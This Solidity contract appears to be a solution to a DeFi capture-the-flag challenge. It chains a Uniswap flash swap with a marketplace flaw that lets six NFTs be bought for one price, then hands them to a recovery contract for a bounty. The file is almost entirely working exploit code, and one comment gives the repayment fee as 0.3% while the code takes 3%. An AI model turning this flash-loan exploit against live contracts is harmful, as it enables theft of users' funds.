// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackerFreeRider {
    IUniswapV2Pair private immutable pair;
    IMarketplace private immutable marketplace;

    IWETH private immutable weth;
    IERC721 private immutable nft;

    address private immutable recoveryContract;
    address private immutable player;

    uint256 private immutable nftPrice;
    uint256[] private tokens;

    constructor(
        address _pair,
        address _marketplace,
        address _weth,
        address _nft,
        address _recoveryContract,
        address _player,
        uint256 _nftPrice,
        uint256[] memory _tokens
    ) payable {
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;

        player = _player;

        nftPrice = _nftPrice;

        tokens = new uint256[](_tokens.length);
        for (uint256 i; i < _tokens.length; i++) {
            tokens[i] = _tokens[i];
        }
    }

    function attack() external payable {
        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
        bytes memory data = abi.encode(nftPrice);
        pair.swap(nftPrice, 0, address(this), data);
    }

    // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 1. Unwrap WETH from Uniswap to native ETH for Marketplace
        weth.withdraw(nftPrice);

        // 2. Buy 6 NFTs for the price of only one (check out the audit issue in the marketplace)
        marketplace.buyMany{ value: nftPrice }(tokens);

        // 3. Pay back the flashswap by giving 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = (nftPrice * 103) / 100;
        weth.deposit{ value: amountToPayBack }();
        weth.transfer(address(pair), amountToPayBack);

        // 4. Send NFTs to recovery contract so we can get the bounty
        bytes memory _data = abi.encode(player); // data = address to receive the prize from recovery contract
        for (uint256 i; i < tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryContract, i, _data);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
